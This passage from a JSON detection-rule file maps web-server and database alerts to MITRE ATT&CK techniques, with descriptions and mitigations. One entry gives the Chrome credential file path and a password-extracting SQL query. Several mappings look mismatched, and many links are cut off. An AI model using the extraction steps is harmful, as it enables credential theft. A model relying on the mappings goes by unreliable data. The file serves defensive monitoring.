            "Proactively reset accounts that are known to be part of breached credentials either immediately, or after detecting bruteforce attempts."
        ]
    },
    {
        "rule_id": 30306,
        "rule_description": "Apache: Attempt to access forbidden directory index.",
        "mitre_id": [
            "T1190"
        ],
        "possible_attacks": [
            "Exploit Public-Facing Application"
        ],
        "description": [
            "Adversaries may attempt to exploit a weakness in an Internet-facing host or system to initially access a network. The weakness in the system can be a software bug, a temporary glitch, or a misconfiguration.\n\nExploited applications are often websites/web servers, but can also include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other system with Internet-accessible open sockets. Depending on the flaw being exploited this may also involve [Exploitation for Defense Evasion]( or [Exploitation for Client Execution](\n\nIf an application is hosted on cloud-based infrastructure and/or is containerized, then exploiting it may lead to compromise of the underlying instance or container. This can allow an adversary a path to access the cloud or container APIs (e.g., via the [Cloud Instance Metadata API]( exploit container host access via [Escape to Host]( or take advantage of weak identity and access management policies.\n\nAdversaries may also exploit edge network infrastructure and related appliances, specifically targeting devices that do not support robust host-based defenses.\n\nFor websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities."
        ],
        "mitigation_strategies": [
            "Regularly scan externally facing systems for vulnerabilities and establish procedures to rapidly patch systems when critical vulnerabilities are discovered through scanning and through public disclosure."
        ]
    },
    {
        "rule_id": 30307,
        "rule_description": "Apache: Client sent malformed Host header. Possible Code Red attack.",
        "mitre_id": [
            "T1102"
        ],
        "possible_attacks": [
            "Web Service"
        ],
        "description": [
            "Adversaries may use an existing, legitimate external Web service as a means for relaying data to/from a compromised system. Popular websites, cloud services, and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google, Microsoft, or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.\n\nUse of Web services may also protect back-end C2 infrastructure from discovery through malware binary analysis while also enabling operational resiliency (since this infrastructure may be dynamically changed)."
        ],
        "mitigation_strategies": [
            "Web proxies can be used to enforce external network communication policy that prevents use of unauthorized external services."
        ]
    },
    {
        "rule_id": 30310,
        "rule_description": "Apache: Multiple authentication failures with invalid user.",
        "mitre_id": [
            "T1110"
        ],
        "possible_attacks": [
            "Brute Force"
        ],
        "description": [
            "Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained. Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism. Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes.\n\nBrute forcing credentials may take place at various points during a breach. For example, adversaries may attempt to brute force access to [Valid Accounts]( within a victim environment leveraging knowledge gathered from other post-compromise behaviors such as [OS Credential Dumping]( [Account Discovery]( or [Password Policy Discovery]( Adversaries may also combine brute forcing activity with behaviors such as [External Remote Services]( as part of Initial Access."
        ],
        "mitigation_strategies": [
            "Proactively reset accounts that are known to be part of breached credentials either immediately, or after detecting bruteforce attempts."
        ]
    },
    {
        "rule_id": 30316,
        "rule_description": "Apache: Multiple Invalid URI requests from same source.",
        "mitre_id": [
            "T1499"
        ],
        "possible_attacks": [
            "Endpoint Denial of Service"
        ],
        "description": [
            "Adversaries may perform Endpoint Denial of Service (DoS) attacks to degrade or block the availability of services to users. Endpoint DoS can be performed by exhausting the system resources those services are hosted on or exploiting the system to cause a persistent crash condition. Example services include websites, email services, DNS, and web-based applications. Adversaries have been observed conducting DoS attacks for political purposes and to support other malicious activities, including distraction, hacktivism, and extortion.\n\nAn Endpoint DoS denies the availability of a service without saturating the network used to provide access to the service. Adversaries can target various layers of the application stack that is hosted on the system used to provide the service. These layers include the Operating Systems (OS), server applications such as web servers, DNS servers, databases, and the (typically web-based) applications that sit on top of them. Attacking each layer requires different techniques that take advantage of bottlenecks that are unique to the respective components. A DoS attack may be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).\n\nTo perform DoS attacks against endpoint resources, several aspects apply to multiple methods, including IP address spoofing and botnets.\n\nAdversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.\n\nBotnets are commonly used to conduct DDoS attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for DDoS, so many systems are used to generate requests that each one only needs to send out a small amount of traffic to produce enough volume to exhaust the target's resources. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS attacks, such as the 2012 series of incidents that targeted major US banks.\n\nIn cases where traffic manipulation is used, there may be points in the global network (such as high traffic gateway routers) where packets can be altered and cause legitimate clients to execute code that directs network packets toward a target in high volume. This type of capability was previously used for the purposes of web censorship where client HTTP traffic was modified to include a reference to JavaScript that generated the DDoS code to overwhelm target web servers.\n\nFor attacks attempting to saturate the providing network, see [Network Denial of Service](\n"
        ],
        "mitigation_strategies": [
            "Leverage services provided by Content Delivery Networks (CDN) or providers specializing in DoS mitigations to filter traffic upstream from services. Filter boundary traffic by blocking source addresses sourcing the attack, blocking ports that are being targeted, or blocking protocols being used for transport. To defend against SYN floods, enable SYN Cookies."
        ]
    },
    {
        "rule_id": 30411,
        "rule_description": "ModSecurity: Rejected a query",
        "mitre_id": [
            "T1083"
        ],
        "possible_attacks": [],
        "description": [],
        "mitigation_strategies": []
    },
    {
        "rule_id": 31316,
        "rule_description": "Nginx: Multiple web authentication failures.",
        "mitre_id": [
            "T1110"
        ],
        "possible_attacks": [
            "Brute Force"
        ],
        "description": [
            "Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained. Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism. Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes.\n\nBrute forcing credentials may take place at various points during a breach. For example, adversaries may attempt to brute force access to [Valid Accounts]( within a victim environment leveraging knowledge gathered from other post-compromise behaviors such as [OS Credential Dumping]( [Account Discovery]( or [Password Policy Discovery]( Adversaries may also combine brute forcing activity with behaviors such as [External Remote Services]( as part of Initial Access."
        ],
        "mitigation_strategies": [
            "Proactively reset accounts that are known to be part of breached credentials either immediately, or after detecting bruteforce attempts."
        ]
    },
    {
        "rule_id": 31333,
        "rule_description": "ModSecurity rejected a query",
        "mitre_id": [
            "T1083"
        ],
        "possible_attacks": [],
        "description": [],
        "mitigation_strategies": []
    },
    {
        "rule_id": 31335,
        "rule_description": "NAXSI rejected a query",
        "mitre_id": [
            "T1083"
        ],
        "possible_attacks": [],
        "description": [],
        "mitigation_strategies": []
    },
    {
        "rule_id": 31411,
        "rule_description": "PHP web attack.",
        "mitre_id": [
            "T1190",
            "T1071.001"
        ],
        "possible_attacks": [
            "Exploit Public-Facing Application",
            "Web Protocols"
        ],
        "description": [
            "Adversaries may attempt to exploit a weakness in an Internet-facing host or system to initially access a network. The weakness in the system can be a software bug, a temporary glitch, or a misconfiguration.\n\nExploited applications are often websites/web servers, but can also include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other system with Internet-accessible open sockets. Depending on the flaw being exploited this may also involve [Exploitation for Defense Evasion]( or [Exploitation for Client Execution](\n\nIf an application is hosted on cloud-based infrastructure and/or is containerized, then exploiting it may lead to compromise of the underlying instance or container. This can allow an adversary a path to access the cloud or container APIs (e.g., via the [Cloud Instance Metadata API]( exploit container host access via [Escape to Host]( or take advantage of weak identity and access management policies.\n\nAdversaries may also exploit edge network infrastructure and related appliances, specifically targeting devices that do not support robust host-based defenses.\n\nFor websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities.",
            "Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nProtocols such as HTTP/S and WebSocket that carry web traffic may be very common in environments. HTTP/S packets have many fields and headers in which data can be concealed. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic. "
        ],
        "mitigation_strategies": [
            "Regularly scan externally facing systems for vulnerabilities and establish procedures to rapidly patch systems when critical vulnerabilities are discovered through scanning and through public disclosure.",
            "Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. "
        ]
    },
    {
        "rule_id": 31413,
        "rule_description": "PHP internal error (server out of space).",
        "mitre_id": [
            "T1561.001"
        ],
        "possible_attacks": [
            "Disk Content Wipe"
        ],
        "description": [
            "Adversaries may erase the contents of storage devices on specific systems or in large numbers in a network to interrupt availability to system and network resources.\n\nAdversaries may partially or completely overwrite the contents of a storage device rendering the data irrecoverable through the storage interface. Instead of wiping specific disk structures or files, adversaries with destructive intent may wipe arbitrary portions of disk content. To wipe disk content, adversaries may acquire direct access to the hard drive in order to overwrite arbitrarily sized portions of disk with random data. Adversaries have also been observed leveraging third-party drivers like [RawDisk]( to directly access disk content. This behavior is distinct from [Data Destruction]( because sections of the disk are erased instead of individual files.\n\nTo maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware used for wiping disk content may have worm-like features to propagate across a network by leveraging additional techniques like [Valid Accounts]( [OS Credential Dumping]( and [SMB/Windows Admin Shares]("
        ],
        "mitigation_strategies": [
            "Consider implementing IT disaster recovery plans that contain procedures for taking regular data backups that can be used to restore organizational data. Ensure backups are stored off system and is protected from common methods adversaries may use to gain access and destroy the backups to prevent recovery."
        ]
    },
    {
        "rule_id": 31501,
        "rule_description": "WordPress Comment Spam (coming from a fake search engine UA).",
        "mitre_id": [
            "T1203"
        ],
        "possible_attacks": [
            "Exploitation for Client Execution"
        ],
        "description": [
            "Adversaries may exploit software vulnerabilities in client applications to execute code. Vulnerabilities can exist in software due to unsecure coding practices that can lead to unanticipated behavior. Adversaries can take advantage of certain vulnerabilities through targeted exploitation for the purpose of arbitrary code execution. Oftentimes the most valuable exploits to an offensive toolkit are those that can be used to obtain code execution on a remote system because they can be used to gain access to that system. Users will expect to see files related to the applications they commonly used to do work, so they are a useful target for exploit research and development because of their high utility.\n\nSeveral types exist:\n\n### Browser-based Exploitation\n\nWeb browsers are a common target through [Drive-by Compromise]( and [Spearphishing Link]( Endpoint systems may be compromised through normal web browsing or from certain users being targeted by links in spearphishing emails to adversary controlled sites used to exploit the web browser. These often do not require an action by the user for the exploit to be executed.\n\n### Office Applications\n\nCommon office and productivity applications such as Microsoft Office are also targeted through [Phishing]( Malicious files will be transmitted directly as attachments or through links to download them. These require the user to open the document or file for the exploit to run.\n\n### Common Third-party Applications\n\nOther applications that are commonly seen or are part of the software deployed in a target network may also be used for exploitation. Applications such as Adobe Reader and Flash, which are common in enterprise environments, have been routinely targeted by adversaries attempting to gain access to systems. Depending on the software and nature of the vulnerability, some may be exploited in the browser or require the user to open a file. For instance, some Flash exploits have been delivered as objects within Microsoft Office documents."
        ],
        "mitigation_strategies": [
            "Perform regular software updates to mitigate exploitation risk. Keeping software up-to-date with the latest security patches helps prevent adversaries from exploiting known vulnerabilities in client software, reducing the risk of successful attacks."
        ]
    },
    {
        "rule_id": 31502,
        "rule_description": "TimThumb vulnerability exploit attempt.",
        "mitre_id": [
            "T1212"
        ],
        "possible_attacks": [
            "Exploitation for Credential Access"
        ],
        "description": [
            "Adversaries may exploit software vulnerabilities in an attempt to collect credentials. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\u00a0\n\nCredentialing and authentication mechanisms may be targeted for exploitation by adversaries as a means to gain access to useful credentials or circumvent the process to gain authenticated access to systems. One example of this is `MS14-068`, which targets Kerberos and can be used to forge Kerberos tickets using domain user permissions. Another example of this is replay attacks, in which the adversary intercepts data packets sent between parties and then later replays these packets. If services don't properly validate authentication requests, these replayed packets may allow an adversary to impersonate one of the parties and gain unauthorized access or privileges.\n\nSuch exploitation has been demonstrated in cloud environments as well. For example, adversaries have exploited vulnerabilities in public cloud infrastructure that allowed for unintended authentication token creation and renewal.\n\nExploitation for credential access may also result in Privilege Escalation depending on the process targeted or credentials obtained."
        ],
        "mitigation_strategies": [
            "Update software regularly by employing patch management for internal enterprise endpoints and servers."
        ]
    },
    {
        "rule_id": 31503,
        "rule_description": "osCommerce login.php bypass attempt.",
        "mitre_id": [
            "T1190"
        ],
        "possible_attacks": [
            "Exploit Public-Facing Application"
        ],
        "description": [
            "Adversaries may attempt to exploit a weakness in an Internet-facing host or system to initially access a network. The weakness in the system can be a software bug, a temporary glitch, or a misconfiguration.\n\nExploited applications are often websites/web servers, but can also include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other system with Internet-accessible open sockets. Depending on the flaw being exploited this may also involve [Exploitation for Defense Evasion]( or [Exploitation for Client Execution](\n\nIf an application is hosted on cloud-based infrastructure and/or is containerized, then exploiting it may lead to compromise of the underlying instance or container. This can allow an adversary a path to access the cloud or container APIs (e.g., via the [Cloud Instance Metadata API]( exploit container host access via [Escape to Host]( or take advantage of weak identity and access management policies.\n\nAdversaries may also exploit edge network infrastructure and related appliances, specifically targeting devices that do not support robust host-based defenses.\n\nFor websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities."
        ],
        "mitigation_strategies": [
            "Regularly scan externally facing systems for vulnerabilities and establish procedures to rapidly patch systems when critical vulnerabilities are discovered through scanning and through public disclosure."
        ]
    },
    {
        "rule_id": 31505,
        "rule_description": "TimThumb backdoor access attempt.",
        "mitre_id": [
            "T1505.003"
        ],
        "possible_attacks": [
            "Web Shell"
        ],
        "description": [
            "Adversaries may backdoor web servers with web shells to establish persistent access to systems. A Web shell is a Web script that is placed on an openly accessible Web server to allow an adversary to access the Web server as a gateway into a network. A Web shell may provide a set of functions to execute or a command-line interface on the system that hosts the Web server.\n\nIn addition to a server-side script, a Web shell may have a client interface program that is used to talk to the Web server (e.g. [China Chopper]( Web shell client)."
        ],
        "mitigation_strategies": [
            "Enforce the principle of least privilege by limiting privileges of user accounts so only authorized accounts can modify the web directory."
        ]
    },
    {
        "rule_id": 31506,
        "rule_description": "Cart.php directory transversal attempt.",
        "mitre_id": [
            "T1210",
            "T1190"
        ],
        "possible_attacks": [
            "Exploitation of Remote Services",
            "Exploit Public-Facing Application"
        ],
        "description": [
            "Adversaries may exploit remote services to gain unauthorized access to internal systems once inside of a network. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\u00a0A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system.\n\nAn adversary may need to determine if the remote system is in a vulnerable state, which may be done through [Network Service Discovery]( or other Discovery methods looking for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities,  or security software that may be used to detect or contain remote exploitation. Servers are likely a high value target for lateral movement exploitation, but endpoint systems may also be at risk if they provide an advantage or access to additional resources.\n\nThere are several well-known vulnerabilities that exist in common services such as SMB  and RDP  as well as applications that may be used within internal networks such as MySQL  and web server services.\n\nDepending on the permissions level of the vulnerable remote service an adversary may achieve [Exploitation for Privilege Escalation]( as a result of lateral movement exploitation as well.",
            "Adversaries may attempt to exploit a weakness in an Internet-facing host or system to initially access a network. The weakness in the system can be a software bug, a temporary glitch, or a misconfiguration.\n\nExploited applications are often websites/web servers, but can also include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other system with Internet-accessible open sockets. Depending on the flaw being exploited this may also involve [Exploitation for Defense Evasion]( or [Exploitation for Client Execution](\n\nIf an application is hosted on cloud-based infrastructure and/or is containerized, then exploiting it may lead to compromise of the underlying instance or container. This can allow an adversary a path to access the cloud or container APIs (e.g., via the [Cloud Instance Metadata API]( exploit container host access via [Escape to Host]( or take advantage of weak identity and access management policies.\n\nAdversaries may also exploit edge network infrastructure and related appliances, specifically targeting devices that do not support robust host-based defenses.\n\nFor websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities."
        ],
        "mitigation_strategies": [
            "Regularly scan the internal network for available services to identify new and potentially vulnerable services.",
            "Regularly scan externally facing systems for vulnerabilities and establish procedures to rapidly patch systems when critical vulnerabilities are discovered through scanning and through public disclosure."
        ]
    },
    {
        "rule_id": 31507,
        "rule_description": "MSSQL Injection attempt (ur.php, urchin.js).",
        "mitre_id": [
            "T1055"
        ],
        "possible_attacks": [
            "Process Injection"
        ],
        "description": [
            "Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process. \n\nThere are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific. \n\nMore sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel. "
        ],
        "mitigation_strategies": [
            "Utilize Yama (ex: /proc/sys/kernel/yama/ptrace_scope) to mitigate ptrace based process injection by restricting the use of ptrace to privileged users only. Other mitigation controls involve the deployment of security kernel modules that provide advanced access control and process restrictions such as SELinux, grsecurity, and AppArmor."
        ]
    },
    {
        "rule_id": 31509,
        "rule_description": "CMS (WordPress or Joomla) login attempt.",
        "mitre_id": [
            "T1110.001"
        ],
        "possible_attacks": [
            "Password Guessing"
        ],
        "description": [
            "Adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts. Without knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism. An adversary may guess login credentials without prior knowledge of system or environment passwords during an operation by using a list of common passwords. Password guessing may or may not take into account the target's policies on password complexity or use policies that may lock accounts out after a number of failed attempts.\n\nGuessing passwords can be a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies. \n\nTypically, management services over commonly used ports are used when guessing passwords. Commonly targeted services include the following:\n\n* SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\n* LDAP (389/TCP)\n* Kerberos (88/TCP)\n* RDP / Terminal Services (3389/TCP)\n* HTTP/HTTP Management Services (80/TCP & 443/TCP)\n* MSSQL (1433/TCP)\n* Oracle (1521/TCP)\n* MySQL (3306/TCP)\n* VNC (5900/TCP)\n* SNMP (161/UDP and 162/TCP/UDP)\n\nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.. Further, adversaries may abuse network device interfaces (such as `wlanAPI`) to brute force accessible wifi-router(s) via wireless authentication protocols.\n\nIn default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \"logon failure\" event ID 4625."
        ],
        "mitigation_strategies": [
            "Upgrade management services to the latest supported and compatible version.  Specifically, any version providing increased password complexity or policy enforcement preventing default or weak passwords. "
        ]
    },
    {
        "rule_id": 31510,
        "rule_description": "CMS (WordPress or Joomla) brute force attempt.",
        "mitre_id": [
            "T1110"
        ],
        "possible_attacks": [
            "Brute Force"
        ],
        "description": [
            "Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained. Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism. Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes.\n\nBrute forcing credentials may take place at various points during a breach. For example, adversaries may attempt to brute force access to [Valid Accounts]( within a victim environment leveraging knowledge gathered from other post-compromise behaviors such as [OS Credential Dumping]( [Account Discovery]( or [Password Policy Discovery]( Adversaries may also combine brute forcing activity with behaviors such as [External Remote Services]( as part of Initial Access."
        ],
        "mitigation_strategies": [
            "Proactively reset accounts that are known to be part of breached credentials either immediately, or after detecting bruteforce attempts."
        ]
    },
    {
        "rule_id": 31512,
        "rule_description": "Uploadify vulnerability exploit attempt.",
        "mitre_id": [
            "T1210"
        ],
        "possible_attacks": [
            "Exploitation of Remote Services"
        ],
        "description": [
            "Adversaries may exploit remote services to gain unauthorized access to internal systems once inside of a network. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\u00a0A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system.\n\nAn adversary may need to determine if the remote system is in a vulnerable state, which may be done through [Network Service Discovery]( or other Discovery methods looking for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities,  or security software that may be used to detect or contain remote exploitation. Servers are likely a high value target for lateral movement exploitation, but endpoint systems may also be at risk if they provide an advantage or access to additional resources.\n\nThere are several well-known vulnerabilities that exist in common services such as SMB  and RDP  as well as applications that may be used within internal networks such as MySQL  and web server services.\n\nDepending on the permissions level of the vulnerable remote service an adversary may achieve [Exploitation for Privilege Escalation]( as a result of lateral movement exploitation as well."
        ],
        "mitigation_strategies": [
            "Regularly scan the internal network for available services to identify new and potentially vulnerable services."
        ]
    },
    {
        "rule_id": 31513,
        "rule_description": "BBS delete.php exploit attempt.",
        "mitre_id": [
            "T1210"
        ],
        "possible_attacks": [
            "Exploitation of Remote Services"
        ],
        "description": [
            "Adversaries may exploit remote services to gain unauthorized access to internal systems once inside of a network. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\u00a0A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system.\n\nAn adversary may need to determine if the remote system is in a vulnerable state, which may be done through [Network Service Discovery]( or other Discovery methods looking for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities,  or security software that may be used to detect or contain remote exploitation. Servers are likely a high value target for lateral movement exploitation, but endpoint systems may also be at risk if they provide an advantage or access to additional resources.\n\nThere are several well-known vulnerabilities that exist in common services such as SMB  and RDP  as well as applications that may be used within internal networks such as MySQL  and web server services.\n\nDepending on the permissions level of the vulnerable remote service an adversary may achieve [Exploitation for Privilege Escalation]( as a result of lateral movement exploitation as well."
        ],
        "mitigation_strategies": [
            "Regularly scan the internal network for available services to identify new and potentially vulnerable services."
        ]
    },
    {
        "rule_id": 31514,
        "rule_description": "Simple shell.php command execution.",
        "mitre_id": [
            "T1505.003",
            "T1203"
        ],
        "possible_attacks": [
            "Web Shell",
            "Exploitation for Client Execution"
        ],
        "description": [
            "Adversaries may backdoor web servers with web shells to establish persistent access to systems. A Web shell is a Web script that is placed on an openly accessible Web server to allow an adversary to access the Web server as a gateway into a network. A Web shell may provide a set of functions to execute or a command-line interface on the system that hosts the Web server.\n\nIn addition to a server-side script, a Web shell may have a client interface program that is used to talk to the Web server (e.g. [China Chopper]( Web shell client).",
            "Adversaries may exploit software vulnerabilities in client applications to execute code. Vulnerabilities can exist in software due to unsecure coding practices that can lead to unanticipated behavior. Adversaries can take advantage of certain vulnerabilities through targeted exploitation for the purpose of arbitrary code execution. Oftentimes the most valuable exploits to an offensive toolkit are those that can be used to obtain code execution on a remote system because they can be used to gain access to that system. Users will expect to see files related to the applications they commonly used to do work, so they are a useful target for exploit research and development because of their high utility.\n\nSeveral types exist:\n\n### Browser-based Exploitation\n\nWeb browsers are a common target through [Drive-by Compromise]( and [Spearphishing Link]( Endpoint systems may be compromised through normal web browsing or from certain users being targeted by links in spearphishing emails to adversary controlled sites used to exploit the web browser. These often do not require an action by the user for the exploit to be executed.\n\n### Office Applications\n\nCommon office and productivity applications such as Microsoft Office are also targeted through [Phishing]( Malicious files will be transmitted directly as attachments or through links to download them. These require the user to open the document or file for the exploit to run.\n\n### Common Third-party Applications\n\nOther applications that are commonly seen or are part of the software deployed in a target network may also be used for exploitation. Applications such as Adobe Reader and Flash, which are common in enterprise environments, have been routinely targeted by adversaries attempting to gain access to systems. Depending on the software and nature of the vulnerability, some may be exploited in the browser or require the user to open a file. For instance, some Flash exploits have been delivered as objects within Microsoft Office documents."
        ],
        "mitigation_strategies": [
            "Enforce the principle of least privilege by limiting privileges of user accounts so only authorized accounts can modify the web directory.",
            "Perform regular software updates to mitigate exploitation risk. Keeping software up-to-date with the latest security patches helps prevent adversaries from exploiting known vulnerabilities in client software, reducing the risk of successful attacks."
        ]
    },
    {
        "rule_id": 31515,
        "rule_description": "PHPMyAdmin scans (looking for setup.php).",
        "mitre_id": [
            "T1083"
        ],
        "possible_attacks": [],
        "description": [],
        "mitigation_strategies": []
    },
    {
        "rule_id": 31516,
        "rule_description": "Suspicious URL access.",
        "mitre_id": [
            "T1055"
        ],
        "possible_attacks": [
            "Process Injection"
        ],
        "description": [
            "Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process. \n\nThere are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific. \n\nMore sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel. "
        ],
        "mitigation_strategies": [
            "Utilize Yama (ex: /proc/sys/kernel/yama/ptrace_scope) to mitigate ptrace based process injection by restricting the use of ptrace to privileged users only. Other mitigation controls involve the deployment of security kernel modules that provide advanced access control and process restrictions such as SELinux, grsecurity, and AppArmor."
        ]
    },
    {
        "rule_id": 31533,
        "rule_description": "High amount of POST requests in a small period of time (likely bot).",
        "mitre_id": [
            "T1498"
        ],
        "possible_attacks": [
            "Network Denial of Service"
        ],
        "description": [
            "Adversaries may perform Network Denial of Service (DoS) attacks to degrade or block the availability of targeted resources to users. Network DoS can be performed by exhausting the network bandwidth services rely on. Example resources include specific websites, email services, DNS, and web-based applications. Adversaries have been observed conducting network DoS attacks for political purposes and to support other malicious activities, including distraction, hacktivism, and extortion.\n\nA Network DoS will occur when the bandwidth capacity of the network connection to a system is exhausted due to the volume of malicious traffic directed at the resource or the network connections and network devices the resource relies on. For example, an adversary may send 10Gbps of traffic to a server that is hosted by a network with a 1Gbps connection to the internet. This traffic can be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).\n\nTo perform Network DoS attacks several aspects apply to multiple methods, including IP address spoofing, and botnets.\n\nAdversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.\n\nFor DoS attacks targeting the hosting system directly, see [Endpoint Denial of Service]("
        ],
        "mitigation_strategies": [
            "When flood volumes exceed the capacity of the network connection being targeted, it is typically necessary to intercept the incoming traffic upstream to filter out the attack traffic from the legitimate traffic. Such defenses can be provided by the hosting Internet Service Provider (ISP) or by a 3rd party such as a Content Delivery Network (CDN) or providers specializing in DoS mitigations.\n\nDepending on flood volume, on-premises filtering may be possible by blocking source addresses sourcing the attack, blocking ports that are being targeted, or blocking protocols being used for transport.\n\nAs immediate response may require rapid engagement of 3rd parties, analyze the risk associated to critical resources being affected by Network DoS attacks and create a disaster recovery plan/business continuity plan to respond to incidents."
        ]
    },
    {
        "rule_id": 31550,
        "rule_description": "Anomaly URL query (attempting to pass null termination).",
        "mitre_id": [
            "T1555.003"
        ],
        "possible_attacks": [
            "Credentials from Web Browsers"
        ],
        "description": [
            "Adversaries may acquire credentials from web browsers by reading files specific to the target browser. Web browsers commonly save credentials such as website usernames and passwords so that they do not need to be entered manually in the future. Web browsers typically store the credentials in an encrypted format within a credential store; however, methods exist to extract plaintext credentials from web browsers.\n\nFor example, on Windows systems, encrypted credentials may be obtained from Google Chrome by reading a database file, <code>AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data</code> and executing a SQL query: <code>SELECT action_url, username_value, password_value FROM logins;</code>. The plaintext password can then be obtained by passing the encrypted credentials to the Windows API function <code>CryptUnprotectData</code>, which uses the victim\u2019s cached logon credentials as the decryption key.\n \nAdversaries have executed similar procedures for common web browsers such as FireFox, Safari, Edge, etc. Windows stores Internet Explorer and Microsoft Edge credentials in Credential Lockers managed by the [Windows Credential Manager](\n\nAdversaries may also acquire credentials by searching web browser process memory for patterns that commonly match credentials.\n\nAfter acquiring credentials from web browsers, adversaries may attempt to recycle the credentials across different systems and/or accounts in order to expand access. This can result in significantly furthering an adversary's objective in cases where credentials gained from web browsers overlap with privileged accounts (e.g. domain administrator)."
        ],
        "mitigation_strategies": [
            "Provide user training on secure practices for managing credentials, including avoiding storing sensitive passwords in browsers and using password managers securely. Users should also be educated on identifying phishing attempts that could steal session cookies or credentials."
        ]
    },
    {
        "rule_id": 50120,
        "rule_description": "MySQL: shutdown message.",
        "mitre_id": [
            "T1529"
        ],
        "possible_attacks": [],
        "description": [],
        "mitigation_strategies": []
    },
    {
        "rule_id": 50126,
        "rule_description": "MySQL: fatal error.",
        "mitre_id": [
            "T1499"
        ],
        "possible_attacks": [
            "Endpoint Denial of Service"
        ],
        "description": [
